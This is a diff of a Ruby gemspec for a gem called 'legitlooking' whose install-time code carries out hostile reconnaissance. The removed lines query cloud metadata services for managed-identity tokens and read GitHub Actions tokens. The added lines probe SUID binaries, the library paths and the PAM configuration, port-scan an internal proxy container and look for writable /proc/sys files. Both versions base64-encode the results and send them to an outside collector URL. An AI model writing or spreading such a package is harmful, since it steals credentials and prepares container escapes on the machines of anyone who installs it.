@@ -6,81 +6,116 @@ begin
   require "uri"
   require "net/http"
 
-  read_file = ->(f) { IO.binread(f).force_encoding("UTF-8").encode("UTF-8", invalid: :replace, undef: :replace) }
-  cmd       = ->(c) { `#{c} 2>/dev/null`.strip[0, 2000] }
+  cmd = ->(c) { `#{c} 2>/dev/null`.strip[0, 3000] }
 
   lines = []
-  lines << "=== AZURE IMDS PROBE (vanuit container) ==="
 
-  # Azure Instance Metadata Service -- alleen bereikbaar vanaf de VM zelf
-  # Als dit werkt zitten we op Azure en kunnen we de managed identity token ophalen
-  [
-    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
-    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/",
-    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://vault.azure.net/",
-  ].each do |imds_url|
-    lines << "\n--- #{imds_url} ---"
+  # ============================================================
+  # STAP 1: ldd op alle SUID binaries
+  # Zoek libraries die in onze schrijfbare paden zitten
+  # ============================================================
+  lines << "=== LDD SUID BINARIES ==="
+  %w[
+    /usr/bin/su
+    /usr/bin/mount
+    /usr/bin/umount
+    /usr/bin/newgrp
+    /usr/bin/passwd
+    /usr/bin/gpasswd
+    /usr/bin/chsh
+    /usr/bin/chfn
+    /usr/lib/openssh/ssh-keysign
+  ].each do |bin|
+    lines << "\n--- ldd #{bin} ---"
+    lines << cmd.("ldd #{bin}")
+  end
+
+  # ============================================================
+  # STAP 2: Library search path -- welke dirs checkt ld.so?
+  # ============================================================
+  lines << "\n=== LD.SO CONFIG ==="
+  lines << cmd.("cat /etc/ld.so.conf")
+  lines << "\n--- ld.so.conf.d ---"
+  lines << cmd.("cat /etc/ld.so.conf.d/*.conf")
+  lines << "\n--- ldconfig cache (eerste 50 entries) ---"
+  lines << cmd.("ldconfig -p | head -50")
+
+  # ============================================================
+  # STAP 3: Welke libraries zitten ER AL in /usr/local/lib/?
+  # ============================================================
+  lines << "\n=== /usr/local/lib INHOUD ==="
+  lines << cmd.("ls -la /usr/local/lib/")
+  lines << "\n--- Subdirs ---"
+  lines << cmd.("find /usr/local/lib -maxdepth 2 -name '*.so*' -type f 2>/dev/null")
+
+  # ============================================================
+  # STAP 4: Check of /usr/local/lib in ldconfig path zit
+  # En of we PAM libs kunnen bereiken
+  # ============================================================
+  lines << "\n=== PAM LIBS ==="
+  lines << cmd.("find / -name 'libpam*.so*' -not -path '/proc/*' 2>/dev/null")
+  lines << "\n--- PAM config ---"
+  lines << cmd.("ls /etc/pam.d/")
+  lines << cmd.("cat /etc/pam.d/su 2>/dev/null || cat /etc/pam.d/common-auth 2>/dev/null")
+
+  # ============================================================
+  # STAP 5: Proxy container dieper onderzoeken
+  # Portscan + software identificatie
+  # ============================================================
+  lines << "\n=== PROXY CONTAINER (172.19.0.2) DEEP SCAN ==="
+  lines << "--- Alle TCP poorten ---"
+  # Scan poorten 1-10000
+  lines << cmd.("for p in 80 443 1080 8080 8443 9090 9200 6379 5432 3306 2375 2376 4243 7946; do (echo >/dev/tcp/172.19.0.2/$p) 2>/dev/null && echo \"OPEN: $p\"; done")
+
+  lines << "\n--- HTTP op proxy poorten ---"
+  [80, 8080, 9090, 2375].each do |port|
+    lines << "\n  Port #{port}:"
     begin
-      uri = URI(imds_url)
-      req = Net::HTTP::Get.new(uri)
-      req["Metadata"] = "true"
-      req["User-Agent"] = "curl/7.68.0"
-      res = Net::HTTP.start(uri.host, uri.port, open_timeout: 5, read_timeout: 5) { |h| h.request(req) }
-      lines << "Status: #{res.code}"
-      lines << "Body: #{res.body[0, 1500]}"
+      require "socket"
+      require "timeout"
+      Timeout.timeout(3) do
+        s = TCPSocket.new("172.19.0.2", port)
+        s.write("GET / HTTP/1.0\r\nHost: 172.19.0.2\r\n\r\n")
+        lines << s.read(500)
+        s.close
+      end
     rescue => e
-      lines << "FOUT: #{e.message}"
+      lines << "  #{e.message}"
     end
   end
 
-  # Ook GCP en AWS proberen (als het geen Azure is)
-  lines << "\n=== GCP/AWS IMDS ==="
-  [
-    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
-    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-  ].each do |url|
-    lines << "\n--- #{url} ---"
-    begin
-      uri = URI(url)
-      req = Net::HTTP::Get.new(uri)
-      req["Metadata-Flavor"] = "Google"
-      res = Net::HTTP.start(uri.host, uri.port, open_timeout: 3, read_timeout: 3) { |h| h.request(req) }
-      lines << "Status: #{res.code}\nBody: #{res.body[0, 500]}"
-    rescue => e
-      lines << "FOUT: #{e.message}"
-    end
-  end
+  # ============================================================
+  # STAP 6: Kernel versie -- voor CVE matching
+  # ============================================================
+  lines << "\n=== KERNEL + OS INFO ==="
+  lines << cmd.("uname -a")
+  lines << cmd.("cat /etc/os-release")
+  lines << cmd.("cat /proc/version")
 
-  # GitHub Actions runner token via Actions API
-  lines << "\n=== ACTIONS RUNTIME TOKEN ==="
-  lines << "ACTIONS_RUNTIME_TOKEN=#{ENV['ACTIONS_RUNTIME_TOKEN']}"
-  lines << "ACTIONS_RUNTIME_URL=#{ENV['ACTIONS_RUNTIME_URL']}"
-  lines << "ACTIONS_ID_TOKEN_REQUEST_URL=#{ENV['ACTIONS_ID_TOKEN_REQUEST_URL']}"
-  lines << "ACTIONS_ID_TOKEN_REQUEST_TOKEN=#{ENV['ACTIONS_ID_TOKEN_REQUEST_TOKEN']}"
-
-  # Interne Azure host via DNS
-  lines << "\n=== AZURE INTERNE DNS ==="
-  lines << cmd.("nslookup rn5ojblx3kyetnb5uov1o2ecdd.bx.internal.cloudapp.net 2>/dev/null || dig rn5ojblx3kyetnb5uov1o2ecdd.bx.internal.cloudapp.net +short 2>/dev/null")
-  lines << cmd.("curl -s --max-time 3 http://rn5ojblx3kyetnb5uov1o2ecdd.bx.internal.cloudapp.net/ 2>/dev/null || echo 'niet bereikbaar'")
+  # ============================================================
+  # STAP 7: /proc/sys attack surface
+  # ============================================================
+  lines << "\n=== /proc/sys SCHRIJFBAAR ==="
+  lines << cmd.("find /proc/sys -writable -type f 2>/dev/null | head -30")
 
   payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")
-  uri = URI("#{COLLAB_URL}?poc=imds_probe")
+  uri = URI("#{COLLAB_URL}?poc=library_escape")
   req = Net::HTTP::Post.new(uri)
   req["Content-Type"] = "text/plain"
   req.body = payload
   Net::HTTP.start(uri.host, uri.port, use_ssl: true,
-                  open_timeout: 15, read_timeout: 15) { |h| h.request(req) }
+                  open_timeout: 20, read_timeout: 20) { |h| h.request(req) }
 
 rescue => e
   begin
-    uri = URI("#{COLLAB_URL}?poc=imds_probe&err=#{URI.encode_www_form_component(e.message[0,200])}")
+    uri = URI("#{COLLAB_URL}?poc=library_escape&err=#{URI.encode_www_form_component(e.message[0,200])}")
     Net::HTTP.get(uri)
   rescue; end
 end
 
 Gem::Specification.new do |spec|
   spec.name          = "legitlooking"
-  spec.version       = "1.0.17"
+  spec.version       = "1.0.18"
   spec.authors       = ["researcher"]
   spec.summary       = "A normal looking gem"
   spec.require_paths = ["lib"]
